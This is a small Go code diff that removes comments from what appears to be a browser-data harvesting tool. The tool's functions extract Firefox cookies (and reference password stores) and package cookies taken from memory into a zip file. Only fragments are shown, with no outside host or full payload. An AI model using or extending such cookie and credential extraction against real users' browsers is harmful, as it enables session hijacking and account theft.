@@ -619,8 +619,7 @@ func convertUnixTime(timestamp int64) string {
 }
 
 func extractFirefoxPasswordsCookies(profilePath string) ([]BrowserCookie, error) {
-	// Firefox stores cookies in cookies.sqlite but also has logins in key4.db
-	// For now, focus on cookies which are unencrypted
+
 	return extractFirefoxCookies(filepath.Join(profilePath, "cookies.sqlite"))
 }
 
@@ -684,7 +683,6 @@ func runMemoryExtraction() {
 		return
 	}
 
-	// Create output file with memory-extracted cookies
 	files := make(map[string][]byte)
 	if err := os.MkdirAll(filepath.Dir(zipPath), 0755); err != nil {
 		fmt.Printf("%s[!] Failed to create output directory: %v%s\n", utils.Red, err, utils.Reset)
